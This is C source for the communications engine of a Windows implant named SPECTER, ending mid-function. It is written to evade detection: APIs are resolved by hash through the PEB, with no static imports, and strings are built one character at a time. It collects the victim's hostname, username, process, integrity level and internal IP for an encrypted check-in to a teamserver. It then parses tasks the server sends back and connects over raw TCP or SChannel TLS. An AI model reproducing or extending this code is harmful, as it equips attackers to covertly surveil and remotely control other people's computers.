/**
 * SPECTER Implant — Communications Engine
 *
 * Raw socket operations via PEB-resolved ws2_32.dll, TLS via SChannel,
 * manual HTTP/1.1 request/response, and encrypted check-in protocol.
 * All API calls resolved dynamically — no static imports.
 */

#include "specter.h"
#include "ntdefs.h"
#include "peb.h"
#include "crypto.h"
#include "config.h"
#include "comms.h"
#include "profile.h"
#include "transform.h"
#include "task_exec.h"
#include "heap.h"

/* ------------------------------------------------------------------ */
/*  Static state                                                       */
/* ------------------------------------------------------------------ */

static COMMS_CONTEXT g_comms_ctx;

#ifdef TEST_BUILD
static QWORD g_test_tick_ms = 0;
#endif

/* ------------------------------------------------------------------ */
/*  Internal helpers — integer to string                                */
/* ------------------------------------------------------------------ */

static DWORD uint_to_str(DWORD val, char *buf, DWORD buf_size) {
    if (buf_size == 0) return 0;

    char tmp[12];
    DWORD len = 0;

    if (val == 0) {
        if (buf_size < 2) return 0;
        buf[0] = '0';
        buf[1] = '\0';
        return 1;
    }

    while (val > 0 && len < sizeof(tmp)) {
        tmp[len++] = '0' + (char)(val % 10);
        val /= 10;
    }

    if (len >= buf_size) return 0;

    /* Reverse into output */
    for (DWORD i = 0; i < len; i++)
        buf[i] = tmp[len - 1 - i];
    buf[len] = '\0';
    return len;
}

/* ------------------------------------------------------------------ */
/*  Internal helpers — hex encode                                      */
/* ------------------------------------------------------------------ */

__attribute__((unused))
static void hex_encode(const BYTE *data, DWORD len, char *out) {
    static const char hex[] = "0123456789abcdef";
    for (DWORD i = 0; i < len; i++) {
        out[i * 2]     = hex[(data[i] >> 4) & 0x0F];
        out[i * 2 + 1] = hex[data[i] & 0x0F];
    }
    out[len * 2] = '\0';
}

/* ------------------------------------------------------------------ */
/*  Internal helpers — little-endian I/O                                */
/* ------------------------------------------------------------------ */

static void store32_le_comms(BYTE *p, DWORD v) {
    p[0] = (BYTE)(v);
    p[1] = (BYTE)(v >> 8);
    p[2] = (BYTE)(v >> 16);
    p[3] = (BYTE)(v >> 24);
}

static DWORD load32_le_comms(const BYTE *p) {
    return (DWORD)p[0] | ((DWORD)p[1] << 8) |
           ((DWORD)p[2] << 16) | ((DWORD)p[3] << 24);
}

/* ------------------------------------------------------------------ */
/*  Dev build trace support                                            */
/* ------------------------------------------------------------------ */

#ifdef SPECTER_DEV_BUILD
static void comms_dev_trace(const char *msg) {
    typedef void (__attribute__((ms_abi)) *fn_Dbg)(const char *);
    static fn_Dbg s_dbg = NULL;
    static BOOL s_resolved = FALSE;
    if (!s_resolved) {
        PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
        if (k32) s_dbg = (fn_Dbg)find_export_by_hash(k32, HASH_OUTPUTDEBUGSTRINGA);
        s_resolved = TRUE;
    }
    if (s_dbg) s_dbg(msg);
}
#define COMMS_TRACE(msg) comms_dev_trace(msg)
#else
#define COMMS_TRACE(msg) ((void)0)
#endif

/* ------------------------------------------------------------------ */
/*  TLV wire format helpers                                            */
/* ------------------------------------------------------------------ */

/* TLV version byte */
#define CHECKIN_TLV_VERSION  0x01

/* Checkin TLV tags (implant -> server) */
#define TLV_SEQ_NUMBER       0x0001
#define TLV_IMPLANT_PUBKEY   0x0002
#define TLV_CHECKIN_COUNT    0x0003
#define TLV_HOSTNAME         0x0010
#define TLV_USERNAME         0x0011
#define TLV_PID              0x0012
#define TLV_OS_VERSION       0x0013
#define TLV_PROCESS_NAME     0x0008
#define TLV_INTEGRITY        0x0009
#define TLV_INTERNAL_IP      0x000B
#define TLV_TASK_RESULT      0x0020
#define TLV_RESULT_TASK_ID   0x0021
#define TLV_RESULT_STATUS    0x0022
#define TLV_RESULT_DATA      0x0023

/* Response TLV tags (server -> implant) */
#define TLV_SESSION_ID       0x0100
#define TLV_TASK_BLOCK       0x0200
#define TLV_TASK_ID          0x0201
#define TLV_TASK_TYPE        0x0202
#define TLV_TASK_ARGS        0x0203

/**
 * Write a single TLV field: [tag: u16 LE][length: u16 LE][value bytes].
 * Returns updated position after the written field.
 */
/* Global limit set by build_checkin_payload so tlv_put can bounds-check. */
static DWORD g_tlv_buf_limit = 0;

static DWORD tlv_put(BYTE *buf, DWORD pos, WORD tag, const BYTE *val, WORD val_len) {
    DWORD needed = pos + 4 + val_len;
    if (g_tlv_buf_limit > 0 && needed > g_tlv_buf_limit)
        return pos; /* refuse to write past buffer — return pos unchanged */
    buf[pos]     = (BYTE)(tag & 0xFF);
    buf[pos + 1] = (BYTE)(tag >> 8);
    buf[pos + 2] = (BYTE)(val_len & 0xFF);
    buf[pos + 3] = (BYTE)(val_len >> 8);
    if (val && val_len > 0)
        spec_memcpy(buf + pos + 4, val, val_len);
    return pos + 4 + val_len;
}

/**
 * Write a TLV field with a u32 LE value.
 */
static DWORD tlv_put_u32(BYTE *buf, DWORD pos, WORD tag, DWORD val) {
    BYTE v[4];
    v[0] = (BYTE)(val);
    v[1] = (BYTE)(val >> 8);
    v[2] = (BYTE)(val >> 16);
    v[3] = (BYTE)(val >> 24);
    return tlv_put(buf, pos, tag, v, 4);
}

/**
 * Write a TLV field with a string value (no null terminator in wire).
 */
static DWORD tlv_put_str(BYTE *buf, DWORD pos, WORD tag, const char *str) {
    DWORD len = 0;
    if (str) { const char *p = str; while (*p) { p++; len++; } }
    return tlv_put(buf, pos, tag, (const BYTE *)str, (WORD)len);
}

/* ------------------------------------------------------------------ */
/*  Host information gathering                                         */
/* ------------------------------------------------------------------ */

/**
 * Gather hostname via PEB-resolved GetComputerNameA.
 * Returns length of hostname string (excluding null), 0 on failure.
 */
static DWORD gather_hostname(char *buf, DWORD buf_len) {
    typedef BOOL (__attribute__((ms_abi)) *fn_GetComputerNameA)(char *, DWORD *);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return 0;
    fn_GetComputerNameA pGetName = (fn_GetComputerNameA)find_export_by_hash(k32, HASH_GETCOMPUTERNAMEA);
    if (!pGetName) return 0;
    DWORD size = buf_len - 1;
    if (!pGetName(buf, &size)) return 0;
    buf[size] = 0;
    return size;
}

/**
 * Gather username via PEB-resolved GetUserNameA (advapi32).
 * Returns length of username string (excluding null), 0 on failure.
 */
static DWORD gather_username(char *buf, DWORD buf_len) {
    typedef BOOL (__attribute__((ms_abi)) *fn_GetUserNameA)(char *, DWORD *);
    PVOID adv = find_module_by_hash(HASH_ADVAPI32_DLL);
    if (!adv) {
        /* advapi32 might not be loaded — try LoadLibraryA */
        typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
        PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
        if (k32) {
            fn_LoadLibraryA pLoad = (fn_LoadLibraryA)find_export_by_hash(k32, 0x0666395B);
            if (pLoad) {
                char name[] = {'a','d','v','a','p','i','3','2','.','d','l','l',0};
                adv = pLoad(name);
            }
        }
    }
    if (!adv) return 0;
    fn_GetUserNameA pGetUser = (fn_GetUserNameA)find_export_by_hash(adv, HASH_GETUSERNAMEA);
    if (!pGetUser) return 0;
    DWORD size = buf_len;
    if (!pGetUser(buf, &size)) return 0;
    if (size > 0) size--; /* Remove null terminator from count */
    return size;
}

/**
 * Gather current PID from TEB (GS:0x30 -> TEB, +0x40 -> ClientId.UniqueProcess).
 */
static DWORD gather_pid(void) {
    PVOID teb;
    __asm__ volatile ("mov %0, gs:[0x30]" : "=r" (teb));
    return (DWORD)(QWORD)(*(PVOID *)((PBYTE)teb + 0x40));
}

/**
 * Gather OS version string "Major.Minor.Build" via RtlGetVersion (ntdll).
 * Returns length of version string, 0 on failure.
 */
static DWORD gather_os_version(char *buf, DWORD buf_len) {
    typedef struct {
        ULONG Size;
        ULONG Major;
        ULONG Minor;
        ULONG Build;
        ULONG Platform;
        WCHAR CSDVersion[128];
    } RTL_OSVERSIONINFOW;
    typedef NTSTATUS (__attribute__((ms_abi)) *fn_RtlGetVersion)(RTL_OSVERSIONINFOW *);

    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll) return 0;
    fn_RtlGetVersion pVer = (fn_RtlGetVersion)find_export_by_hash(ntdll, HASH_RTLGETVERSION);
    if (!pVer) return 0;

    RTL_OSVERSIONINFOW vi;
    spec_memset(&vi, 0, sizeof(vi));
    vi.Size = sizeof(vi);
    if (pVer(&vi) != 0) return 0;

    /* Format: "Major.Minor.Build" */
    DWORD pos = 0;
    pos += uint_to_str(vi.Major, buf + pos, buf_len - pos);
    if (pos < buf_len) buf[pos++] = '.';
    pos += uint_to_str(vi.Minor, buf + pos, buf_len - pos);
    if (pos < buf_len) buf[pos++] = '.';
    pos += uint_to_str(vi.Build, buf + pos, buf_len - pos);
    return pos;
}

/**
 * Gather process name from PEB->Ldr->InLoadOrderModuleList.
 * The first entry in load order is the exe itself; we extract BaseDllName.
 * Returns length of process name (excluding null), 0 on failure.
 */
static DWORD gather_process_name(char *buf, DWORD buf_len) {
    if (!buf || buf_len < 2) return 0;

    /* TEB -> PEB -> Ldr -> InLoadOrderModuleList -> first entry -> BaseDllName */
    PVOID teb;
    __asm__ volatile ("mov %0, gs:[0x30]" : "=r" (teb));
    PPEB peb = *(PPEB *)((PBYTE)teb + 0x60);
    if (!peb || !peb->Ldr) return 0;

    PLIST_ENTRY head = &peb->Ldr->InLoadOrderModuleList;
    PLIST_ENTRY entry = head->Flink;
    if (!entry || entry == head) return 0;

    PLDR_DATA_TABLE_ENTRY mod = (PLDR_DATA_TABLE_ENTRY)entry;
    UNICODE_STRING *name = &mod->BaseDllName;
    if (!name->Buffer || name->Length == 0) return 0;

    /* Convert wide string to narrow (ASCII subset) */
    DWORD wlen = name->Length / sizeof(WCHAR);
    DWORD out_len = (wlen < buf_len - 1) ? wlen : buf_len - 1;
    for (DWORD i = 0; i < out_len; i++) {
        WCHAR wc = name->Buffer[i];
        buf[i] = (wc < 128) ? (char)wc : '?';
    }
    buf[out_len] = '\0';
    return out_len;
}

/**
 * Gather integrity level via NtOpenProcessToken + NtQueryInformationToken.
 * Writes "Low", "Medium", "High", or "System" into buf.
 * Returns length of string (excluding null), 0 on failure.
 */
static DWORD gather_integrity_level(char *buf, DWORD buf_len) {
    if (!buf || buf_len < 8) return 0;

    /* Resolve NtOpenProcessToken and NtQueryInformationToken from ntdll */
    typedef NTSTATUS (__attribute__((ms_abi)) *fn_NtOpenProcessToken)(
        HANDLE ProcessHandle, DWORD DesiredAccess, HANDLE *TokenHandle);
    typedef NTSTATUS (__attribute__((ms_abi)) *fn_NtQueryInformationToken)(
        HANDLE TokenHandle, DWORD TokenInformationClass,
        PVOID TokenInformation, ULONG TokenInformationLength,
        PULONG ReturnLength);
    typedef NTSTATUS (__attribute__((ms_abi)) *fn_NtClose)(HANDLE Handle);

    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll) return 0;

    fn_NtOpenProcessToken pOpenToken =
        (fn_NtOpenProcessToken)find_export_by_hash(ntdll, HASH_NTOPENPROCESSTOKEN);
    fn_NtQueryInformationToken pQueryToken =
        (fn_NtQueryInformationToken)find_export_by_hash(ntdll, HASH_NTQUERYINFORMATIONTOKEN);

    fn_NtClose pClose = (fn_NtClose)find_export_by_hash(ntdll, HASH_NTCLOSE);

    if (!pOpenToken || !pQueryToken || !pClose) return 0;

    /* Open current process token with TOKEN_QUERY (0x0008) */
    HANDLE token = NULL;
    NTSTATUS status = pOpenToken((HANDLE)(ULONG_PTR)-1, 0x0008, &token);
    if (status != 0 || !token) return 0;

    /* Query TokenIntegrityLevel (class 25) */
    BYTE info_buf[64];
    ULONG ret_len = 0;
    status = pQueryToken(token, 25, info_buf, sizeof(info_buf), &ret_len);
    pClose(token);
    if (status != 0) return 0;

    /* TOKEN_MANDATORY_LABEL: { SID_AND_ATTRIBUTES { PSID, DWORD } }
     * PSID is at offset 0, pointing to a SID structure.
     * The integrity RID is the last sub-authority of the SID.
     * SID layout: Revision(1) SubAuthorityCount(1) Authority(6) SubAuthority[n](4 each)
     */
    PVOID psid = *(PVOID *)info_buf;
    if (!psid) return 0;

    BYTE *sid = (BYTE *)psid;
    BYTE sub_count = sid[1];
    if (sub_count == 0) return 0;

    /* Last sub-authority is the integrity RID */
    DWORD *sub_auths = (DWORD *)(sid + 8);
    DWORD rid = sub_auths[sub_count - 1];

    const char *level;
    DWORD level_len;
    if (rid >= 0x4000) {
        /* S-y-s-t-e-m */
        char s[] = {'S','y','s','t','e','m',0};
        level = s; level_len = 6;
        spec_memcpy(buf, level, level_len);
    } else if (rid >= 0x3000) {
        char s[] = {'H','i','g','h',0};
        level = s; level_len = 4;
        spec_memcpy(buf, level, level_len);
    } else if (rid >= 0x2000) {
        char s[] = {'M','e','d','i','u','m',0};
        level = s; level_len = 6;
        spec_memcpy(buf, level, level_len);
    } else {
        char s[] = {'L','o','w',0};
        level = s; level_len = 3;
        spec_memcpy(buf, level, level_len);
    }
    buf[level_len] = '\0';
    return level_len;
}

/**
 * Gather internal (non-loopback) IPv4 address via gethostname + gethostbyname.
 * Writes dotted-quad string into buf. Returns length, 0 on failure.
 */
static DWORD gather_internal_ip(char *buf, DWORD buf_len) {
    if (!buf || buf_len < 16) return 0;

    /* Resolve gethostname and gethostbyname from ws2_32 */
    typedef int (__attribute__((ms_abi)) *fn_gethostname)(char *, int);
    typedef struct hostent *(__attribute__((ms_abi)) *fn_gethostbyname)(const char *);

    PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
    if (!ws2) return 0;

    fn_gethostname pGetHostName =
        (fn_gethostname)find_export_by_hash(ws2, HASH_GETHOSTNAME);
    fn_gethostbyname pGetHostByName =
        (fn_gethostbyname)find_export_by_hash(ws2, HASH_GETHOSTBYNAME);

    if (!pGetHostName || !pGetHostByName) return 0;

    char hostname[256];
    if (pGetHostName(hostname, sizeof(hostname)) != 0) return 0;

    /* struct hostent { char *h_name; char **h_aliases; short h_addrtype;
     *                  short h_length; char **h_addr_list; } */
    typedef struct {
        char  *h_name;
        char **h_aliases;
        short  h_addrtype;
        short  h_length;
        char **h_addr_list;
    } HOSTENT;

    HOSTENT *he = (HOSTENT *)pGetHostByName(hostname);
    if (!he || !he->h_addr_list) return 0;

    /* Find first non-loopback IPv4 address */
    for (int i = 0; he->h_addr_list[i]; i++) {
        BYTE *addr = (BYTE *)he->h_addr_list[i];
        if (addr[0] == 127) continue; /* Skip loopback */

        /* Format as dotted quad: a.b.c.d */
        DWORD pos = 0;
        for (int octet = 0; octet < 4; octet++) {
            if (octet > 0 && pos < buf_len) buf[pos++] = '.';
            pos += uint_to_str((DWORD)addr[octet], buf + pos, buf_len - pos);
        }
        buf[pos] = '\0';
        return pos;
    }

    return 0;
}

/* ------------------------------------------------------------------ */
/*  TLV response parser                                                */
/* ------------------------------------------------------------------ */

/**
 * Parse a TLV-encoded checkin response from the teamserver.
 * Extracts SESSION_ID and iterates TASK_BLOCK entries.
 * Parsed tasks are queued into impl_ctx->pending_tasks[].
 */
static void parse_checkin_response(IMPLANT_CONTEXT *impl_ctx, COMMS_CONTEXT *comms,
                                    const BYTE *data, DWORD len) {
    if (len < 1 || data[0] != CHECKIN_TLV_VERSION) return;

    DWORD pos = 1;
    while (pos + 4 <= len) {
        WORD tag  = (WORD)data[pos] | ((WORD)data[pos + 1] << 8);
        WORD vlen = (WORD)data[pos + 2] | ((WORD)data[pos + 3] << 8);
        pos += 4;
        if (pos + vlen > len) break;

        switch (tag) {
        case TLV_SESSION_ID:
            /* Store session ID for future checkins (optional) */
            break;
        case TLV_TASK_BLOCK: {
            /* Parse nested task TLV: TASK_ID, TASK_TYPE, TASK_ARGS */
            if (impl_ctx->pending_task_count >= MAX_PENDING_TASKS)
                break;

            TASK *t = &impl_ctx->pending_tasks[impl_ctx->pending_task_count];
            spec_memset(t, 0, sizeof(TASK));

            /* Iterate nested TLV within the TASK_BLOCK */
            const BYTE *block = data + pos;
            DWORD bpos = 0;
            char type_buf[32];
            DWORD type_len = 0;
            spec_memset(type_buf, 0, sizeof(type_buf));

            while (bpos + 4 <= vlen) {
                WORD btag  = (WORD)block[bpos] | ((WORD)block[bpos + 1] << 8);
                WORD blen  = (WORD)block[bpos + 2] | ((WORD)block[bpos + 3] << 8);
                bpos += 4;
                if (bpos + blen > vlen) break;

                switch (btag) {
                case TLV_TASK_ID: {
                    DWORD copy = blen;
                    if (copy > 63) copy = 63;
                    spec_memcpy(t->task_id, block + bpos, copy);
                    t->task_id[copy] = 0;
                    break;
                }
                case TLV_TASK_TYPE: {
                    DWORD copy = blen;
                    if (copy > 31) copy = 31;
                    spec_memcpy(type_buf, block + bpos, copy);
                    type_buf[copy] = 0;
                    type_len = copy;
                    break;
                }
                case TLV_TASK_ARGS: {
                    if (blen > 0) {
                        t->data = (BYTE *)task_alloc(blen + 1);
                        if (t->data) {
                            spec_memcpy(t->data, block + bpos, blen);
                            t->data[blen] = 0; /* null-terminate for string data */
                            t->data_len = blen;
                        }
                    }
                    break;
                }
                }
                bpos += blen;
            }

            /* Convert task_type string to enum */
            t->task_type = parse_task_type(type_buf, type_len);

            /* Only queue if we got a valid task_id and type */
            if (t->task_id[0] != 0 && t->task_type != 0) {
                impl_ctx->pending_task_count++;
            } else {
                /* Invalid task — free any allocated data */
                if (t->data) {
                    task_free(t->data);
                    t->data = NULL;
                }
            }
            break;
        }
        }
        pos += vlen;
    }
}

/* ------------------------------------------------------------------ */
/*  API resolution                                                     */
/* ------------------------------------------------------------------ */

static NTSTATUS comms_resolve_apis(COMMS_API *api) {
    if (api->resolved)
        return STATUS_SUCCESS;

    /* The stub exe may not import ws2_32/secur32, so load them first.
       Resolve LoadLibraryA from kernel32 (already loaded). */
    typedef PVOID (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32) return (NTSTATUS)0xC0000160; /* 160 = no kernel32 */
    fn_LoadLibraryA pLoadLib = (fn_LoadLibraryA)find_export_by_hash(k32, 0x0666395B);
    if (!pLoadLib) return (NTSTATUS)0xC0000161; /* 161 = no LoadLibraryA */

    /* Resolve ws2_32.dll — try PEB first, fall back to LoadLibraryA */
    PVOID ws2 = find_module_by_hash(HASH_WS2_32_DLL);
    if (!ws2) {
        char ws2_name[] = {'w','s','2','_','3','2','.','d','l','l',0};
        ws2 = pLoadLib(ws2_name);
    }
    if (!ws2) return (NTSTATUS)0xC0000162; /* 162 = no ws2_32 */

    api->pWSAStartup    = (fn_WSAStartup)find_export_by_hash(ws2, HASH_WSASTARTUP);
    api->pSocket        = (fn_socket)find_export_by_hash(ws2, HASH_SOCKET);
    api->pConnect       = (fn_connect)find_export_by_hash(ws2, HASH_CONNECT);
    api->pSend          = (fn_send)find_export_by_hash(ws2, HASH_SEND);
    api->pRecv          = (fn_recv)find_export_by_hash(ws2, HASH_RECV);
    api->pClosesocket   = (fn_closesocket)find_export_by_hash(ws2, HASH_CLOSESOCKET);
    api->pGetaddrinfo   = (fn_getaddrinfo)find_export_by_hash(ws2, HASH_GETADDRINFO);
    api->pFreeaddrinfo  = (fn_freeaddrinfo)find_export_by_hash(ws2, HASH_FREEADDRINFO);

    if (!api->pWSAStartup || !api->pSocket || !api->pConnect ||
        !api->pSend || !api->pRecv || !api->pClosesocket ||
        !api->pGetaddrinfo || !api->pFreeaddrinfo)
        return (NTSTATUS)0xC0000163; /* 163 = ws2_32 export missing */

    /* Resolve secur32.dll (may forward to sspicli.dll) */
    PVOID sec = find_module_by_hash(HASH_SECUR32_DLL);
    if (!sec)
        sec = find_module_by_hash(HASH_SSPICLI_DLL);
    if (!sec && pLoadLib) {
        char sec_name[] = {'s','e','c','u','r','3','2','.','d','l','l',0};
        sec = pLoadLib(sec_name);
    }
    if (!sec) return (NTSTATUS)0xC0000164; /* 164 = no secur32 */

    api->pAcquireCredentialsHandleA  = (fn_AcquireCredentialsHandleA)find_export_by_hash(sec, HASH_ACQUIRECREDHANDLE);
    api->pInitializeSecurityContextA = (fn_InitializeSecurityContextA)find_export_by_hash(sec, HASH_INITSECCTX);
    api->pDeleteSecurityContext      = (fn_DeleteSecurityContext)find_export_by_hash(sec, HASH_DELETESECCTX);
    api->pFreeCredentialsHandle      = (fn_FreeCredentialsHandle)find_export_by_hash(sec, HASH_FREECREDHANDLE);
    api->pEncryptMessage             = (fn_EncryptMessage)find_export_by_hash(sec, HASH_ENCRYPTMSG);
    api->pDecryptMessage             = (fn_DecryptMessage)find_export_by_hash(sec, HASH_DECRYPTMSG);
    api->pQueryContextAttributesA    = (fn_QueryContextAttributesA)find_export_by_hash(sec, HASH_QUERYSECCTXATTR);
    api->pFreeContextBuffer          = (fn_FreeContextBuffer)find_export_by_hash(sec, HASH_FREECTXBUFFER);
    api->pApplyControlToken          = (fn_ApplyControlToken)find_export_by_hash(sec, HASH_APPLYCTRLTOKEN);

    /* TLS (SChannel) exports are optional — HTTP channels don't need them.
       Flag as resolved even if SSPI functions are missing; TLS init will
       check and fail gracefully if a TLS channel is requested. */
    api->tls_available = (api->pAcquireCredentialsHandleA &&
                          api->pInitializeSecurityContextA &&
                          api->pDeleteSecurityContext &&
                          api->pFreeCredentialsHandle &&
                          api->pEncryptMessage &&
                          api->pDecryptMessage &&
                          api->pQueryContextAttributesA &&
                          api->pFreeContextBuffer);

    api->resolved = TRUE;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  Raw TCP operations                                                 */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tcp_connect(COMMS_CONTEXT *ctx, const char *host, DWORD port) {
    if (!ctx || !host) return STATUS_INVALID_PARAMETER;

    COMMS_API *api = &ctx->api;

    /* Initialize Winsock if needed */
    if (!ctx->wsa_initialized) {
        WSADATA wsa;
        int err = api->pWSAStartup(0x0202, &wsa);
        if (err != 0) return STATUS_UNSUCCESSFUL;
        ctx->wsa_initialized = TRUE;
    }

    /* Convert port to string */
    char port_str[8];
    uint_to_str(port, port_str, sizeof(port_str));

    /* Resolve address */
    ADDRINFO hints;
    spec_memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    ADDRINFO *result = NULL;
    int ret = api->pGetaddrinfo(host, port_str, &hints, &result);
    if (ret != 0 || !result) return STATUS_UNSUCCESSFUL;

    /* Create socket */
    ULONG_PTR sock = api->pSocket(result->ai_family,
                                   result->ai_socktype,
                                   result->ai_protocol);
    if (sock == INVALID_SOCKET) {
        api->pFreeaddrinfo(result);
        return STATUS_UNSUCCESSFUL;
    }

    /* Connect */
    ret = api->pConnect(sock, result->ai_addr, (int)result->ai_addrlen);
    api->pFreeaddrinfo(result);

    if (ret == SOCKET_ERROR) {
        api->pClosesocket(sock);
        return STATUS_UNSUCCESSFUL;
    }

    ctx->socket = sock;
    ctx->state = COMMS_STATE_TCP_CONNECTED;
    return STATUS_SUCCESS;
}

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tcp_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) {
    if (!ctx || !data || len == 0) return STATUS_INVALID_PARAMETER;

    DWORD sent = 0;
    while (sent < len) {
        int n = ctx->api.pSend(ctx->socket,
                                (const char *)(data + sent),
                                (int)(len - sent), 0);
        if (n <= 0) return STATUS_UNSUCCESSFUL;
        sent += (DWORD)n;
    }
    return STATUS_SUCCESS;
}

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tcp_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) {
    if (!ctx || !buf || buf_len == 0 || !received) return STATUS_INVALID_PARAMETER;

    int n = ctx->api.pRecv(ctx->socket, (char *)buf, (int)buf_len, 0);
    if (n <= 0) {
        *received = 0;
        return STATUS_UNSUCCESSFUL;
    }
    *received = (DWORD)n;
    return STATUS_SUCCESS;
}

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tcp_close(COMMS_CONTEXT *ctx) {
    if (!ctx) return STATUS_INVALID_PARAMETER;

    if (ctx->socket != 0 && ctx->socket != INVALID_SOCKET) {
        ctx->api.pClosesocket(ctx->socket);
        ctx->socket = INVALID_SOCKET;
    }
    ctx->state = COMMS_STATE_DISCONNECTED;
    return STATUS_SUCCESS;
}

/* ------------------------------------------------------------------ */
/*  TLS via SChannel                                                   */
/* ------------------------------------------------------------------ */

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tls_init(COMMS_CONTEXT *ctx) {
    if (!ctx) return STATUS_INVALID_PARAMETER;

    COMMS_API *api = &ctx->api;

    /* TLS init is optional — skip if SChannel APIs weren't resolved */
    if (!api->tls_available)
        return STATUS_SUCCESS;

    SCHANNEL_CRED cred;
    spec_memset(&cred, 0, sizeof(cred));
    cred.dwVersion = SCHANNEL_CRED_VERSION;
    cred.grbitEnabledProtocols = SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT;
    cred.dwFlags = SCH_USE_STRONG_CRYPTO;

    char unisp[] = UNISP_NAME_A;
    LONG status = api->pAcquireCredentialsHandleA(
        NULL, unisp, SECPKG_CRED_OUTBOUND, NULL, &cred,
        NULL, NULL, &ctx->cred_handle, NULL);

    if (status != SEC_E_OK)
        return STATUS_UNSUCCESSFUL;

    return STATUS_SUCCESS;
}

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tls_handshake(COMMS_CONTEXT *ctx, const char *hostname) {
    if (!ctx || !hostname) return STATUS_INVALID_PARAMETER;

    COMMS_API *api = &ctx->api;
    ctx->state = COMMS_STATE_TLS_HANDSHAKE;

    DWORD isc_flags = ISC_REQ_SEQUENCE_DETECT | ISC_REQ_REPLAY_DETECT |
                      ISC_REQ_CONFIDENTIALITY | ISC_REQ_ALLOCATE_MEMORY |
                      ISC_REQ_STREAM | ISC_REQ_MANUAL_CRED_VALIDATION;

    SecBuffer out_buf = { 0, SECBUFFER_TOKEN, NULL };
    SecBufferDesc out_desc = { SECBUFFER_VERSION, 1, &out_buf };
    ULONG attrs = 0;

    /* Initial call — no input token */
    LONG status = api->pInitializeSecurityContextA(
        &ctx->cred_handle, NULL, (char *)hostname, isc_flags,
        0, 0, NULL, 0, &ctx->sec_context, &out_desc, &attrs, NULL);

    if (status != SEC_I_CONTINUE_NEEDED && status != SEC_E_OK) {
        ctx->state = COMMS_STATE_ERROR;
        return STATUS_UNSUCCESSFUL;
    }

    ctx->context_valid = TRUE;

    /* Send initial token */
    if (out_buf.cbBuffer > 0 && out_buf.pvBuffer) {
        NTSTATUS ns = comms_tcp_send(ctx, (BYTE *)out_buf.pvBuffer, out_buf.cbBuffer);
        api->pFreeContextBuffer(out_buf.pvBuffer);
        if (!NT_SUCCESS(ns)) {
            ctx->state = COMMS_STATE_ERROR;
            return ns;
        }
    }

    /* Handshake loop */
    BYTE hs_buf[16384];
    DWORD hs_used = 0;

    while (status == SEC_I_CONTINUE_NEEDED || status == SEC_E_INCOMPLETE_MESSAGE) {
        /* Read data from server */
        DWORD received = 0;
        NTSTATUS ns = comms_tcp_recv(ctx, hs_buf + hs_used,
                                      (DWORD)(sizeof(hs_buf) - hs_used), &received);
        if (!NT_SUCCESS(ns)) {
            ctx->state = COMMS_STATE_ERROR;
            return ns;
        }
        hs_used += received;

        /* Set up input buffers */
        SecBuffer in_bufs[2];
        in_bufs[0].cbBuffer = hs_used;
        in_bufs[0].BufferType = SECBUFFER_TOKEN;
        in_bufs[0].pvBuffer = hs_buf;
        in_bufs[1].cbBuffer = 0;
        in_bufs[1].BufferType = SECBUFFER_EMPTY;
        in_bufs[1].pvBuffer = NULL;

        SecBufferDesc in_desc = { SECBUFFER_VERSION, 2, in_bufs };

        out_buf.cbBuffer = 0;
        out_buf.BufferType = SECBUFFER_TOKEN;
        out_buf.pvBuffer = NULL;
        out_desc.cBuffers = 1;
        out_desc.pBuffers = &out_buf;

        status = api->pInitializeSecurityContextA(
            &ctx->cred_handle, &ctx->sec_context, (char *)hostname,
            isc_flags, 0, 0, &in_desc, 0, NULL, &out_desc, &attrs, NULL);

        /* Send any output token */
        if (out_buf.cbBuffer > 0 && out_buf.pvBuffer) {
            ns = comms_tcp_send(ctx, (BYTE *)out_buf.pvBuffer, out_buf.cbBuffer);
            api->pFreeContextBuffer(out_buf.pvBuffer);
            if (!NT_SUCCESS(ns)) {
                ctx->state = COMMS_STATE_ERROR;
                return ns;
            }
        }

        /* Handle extra data (unconsumed by SChannel) */
        if (in_bufs[1].BufferType == SECBUFFER_EXTRA && in_bufs[1].cbBuffer > 0) {
            spec_memmove(hs_buf, hs_buf + (hs_used - in_bufs[1].cbBuffer),
                         in_bufs[1].cbBuffer);
            hs_used = in_bufs[1].cbBuffer;
        } else if (status != SEC_E_INCOMPLETE_MESSAGE) {
            hs_used = 0;
        }

        if (status == SEC_E_OK)
            break;

        if (status != SEC_I_CONTINUE_NEEDED &&
            status != SEC_E_INCOMPLETE_MESSAGE &&
            status != SEC_I_INCOMPLETE_CREDENTIALS) {
            ctx->state = COMMS_STATE_ERROR;
            return STATUS_UNSUCCESSFUL;
        }
    }

    /* Query stream sizes for encrypt/decrypt */
    api->pQueryContextAttributesA(&ctx->sec_context,
        SECPKG_ATTR_STREAM_SIZES, &ctx->stream_sizes);

    ctx->state = COMMS_STATE_TLS_CONNECTED;
    return STATUS_SUCCESS;
}

#ifdef TEST_BUILD
__attribute__((weak))
#endif
NTSTATUS comms_tls_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) {
    if (!ctx || !data || len == 0) return STATUS_INVALID_PARAMETER;
    if (!ctx->context_valid) return STATUS_INVALID_HANDLE;

    COMMS_API *api = &ctx->api;
    DWORD max_msg = ctx->stream_sizes.cbMaximumMessage;
